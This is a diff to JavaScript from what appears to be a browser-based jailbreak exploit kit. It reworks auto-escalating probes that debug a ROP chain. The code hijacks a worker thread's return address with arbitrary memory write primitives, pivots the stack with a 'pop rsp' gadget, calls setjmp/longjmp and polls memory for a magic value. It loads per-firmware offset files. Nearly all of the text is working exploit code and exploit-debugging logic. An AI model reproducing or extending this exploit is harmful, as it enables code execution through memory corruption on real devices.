@@ -217,35 +217,46 @@ async function prepare(p) {
            its own crumbs (w1/w2/armed/pm) in between -- so a dead null chain
            ends the trail at 'pm', not at 'nc'. Test for the missing CLOSING
            crumb, not for the last one. */
+        /* Ladder by the FURTHEST stage already attempted. Every probe runs
+           inside launch_chain, which is reached from chain.run(), so every
+           probe trail also contains 'nc' with no 'nc-ok'. Matching on that
+           first sent a run that had already reached probe=sj back to
+           probe=pivot. Rank the stages and advance from the highest seen. */
+        const stageOf = (x) =>
+            x.indexOf("probe-sj") === 0 ? 3
+            : x.indexOf("probe-rsp") === 0 ? 2
+            : x.indexOf("probe-pivot") === 0 ? 1 : 0;
+        const maxStage = parts.reduce((m, x) => Math.max(m, stageOf(x)), 0);
         const diedInNullChain = parts.indexOf("nc") !== -1
             && parts.indexOf("nc-ok") === -1;
-        const triedPivotProbe = parts.some(x => x.indexOf("probe-pivot") === 0);
-        const pivotWasSilent = parts.indexOf("probe-pivot-SILENT") !== -1;
-        const triedRspProbe = parts.some(x => x.indexOf("probe-rsp") === 0);
-        const rspWasSilent = parts.indexOf("probe-rsp-SILENT") !== -1;
-        const triedSjProbe = parts.some(x => x.indexOf("probe-sj") === 0);
-        if (!PROBE && rspWasSilent && !triedSjProbe) {
+        const sawSilent = (pfx) => parts.indexOf(pfx + "-SILENT") !== -1;
+        const sjFinished = parts.some(x => x.indexOf("probe-sj-SILENT") === 0
+            || x.indexOf("probe-sj-ANSWERED") === 0);
+
+        if (!PROBE && maxStage === 3 && !sjFinished) {
+            PROBE = "sj";
+            jbmark("PROBE-AUTO", "probe=sj was interrupted before it could read"
+                + " its results back (trail ends mid-wait) -- repeating it."
+                + " It parks the worker and then reports; let it finish.");
+        } else if (!PROBE && maxStage === 2 && sawSilent("probe-rsp")) {
             PROBE = "sj";
             jbmark("PROBE-AUTO", "pop rsp and the stack switch both work, so the"
                 + " fault is the write gadgets or setjmp/longjmp -- escalating to"
                 + " probe=sj, which runs both and reads the results back");
-        } else if (!PROBE && pivotWasSilent && !triedRspProbe) {
+        } else if (!PROBE && maxStage === 1 && sawSilent("probe-pivot")) {
             PROBE = "rsp";
             jbmark("PROBE-AUTO", "the hijacked return address executes cleanly"
                 + " (infloop parked the worker, no crash) -- escalating to"
                 + " probe=rsp to test `pop rsp` and the stack switch");
-        } else if (!PROBE && diedInNullChain && !triedPivotProbe) {
+        } else if (!PROBE && maxStage === 0 && diedInNullChain) {
             PROBE = "pivot";
             jbmark("PROBE-AUTO", "the EMPTY chain died (nc with no nc-ok), so the"
                 + " syscall stub is exonerated -- setjmp/longjmp or the pivot"
                 + " itself is at fault. Escalating to probe=pivot this run");
-        } else if (!PROBE && triedPivotProbe) {
-            jbmark("PROBE-VERDICT", "the previous run died at '" + last
-                + "', i.e. the WORKER CRASHED with only a `jmp $` written into"
-                + " the return slot. Nothing of ours executed but that one"
-                + " store, so the hijacked slot is not a live return address"
-                + " for this frame -- the frame choice is wrong, not the chain."
-                + " Re-rank OFFSET_lk_worker_wait_return (0x39843 / 0x33d1e).");
+        } else if (!PROBE && maxStage >= 1 && !sawSilent("probe-pivot")
+            && !sawSilent("probe-rsp") && !sjFinished) {
+            jbmark("PROBE-VERDICT", "a probe run CRASHED at '" + parts[parts.length - 1]
+                + "' -- that stage is the culprit; see its comment in main.js");
         }
     }
     crumb("prep");
@@ -814,11 +825,24 @@ async function prepare(p) {
             p.write8(return_address_ptr, gadgets["pop rsp"]);
             p.write8(stack_pointer_ptr, stk);
             crumb("probe-sj-armed");
+            jbmark("PROBE-WAIT", "probe=sj armed -- parking the worker and"
+                + " reading memory back; this takes about a second, do NOT reload");
             const ans = await new Promise((resolve) => {
-                const t = setTimeout(() => resolve(false), 6000);
-                worker.onmessage = function () { clearTimeout(t); resolve(true); };
+                let done = false;
+                const finish = (v) => { if (!done) { done = true; resolve(v); } };
+                worker.onmessage = function () { finish(true); };
                 crumb("probe-sj-pm");
                 worker.postMessage(0);
+                // The chain writes MAGIC before it parks, so poll for it: the
+                // answer arrives in milliseconds and no long deadline is needed.
+                let n = 0;
+                const iv = setInterval(() => {
+                    const v = p.read8(scratch);
+                    if ((v.low === MAGIC.low && v.hi === MAGIC.hi) || ++n > 30) {
+                        clearInterval(iv);
+                        finish(false);
+                    }
+                }, 100);
             });
             const got = p.read8(scratch);
             const wroteOK = got.low === MAGIC.low && got.hi === MAGIC.hi;
@@ -1001,4 +1025,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=27`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=28`);
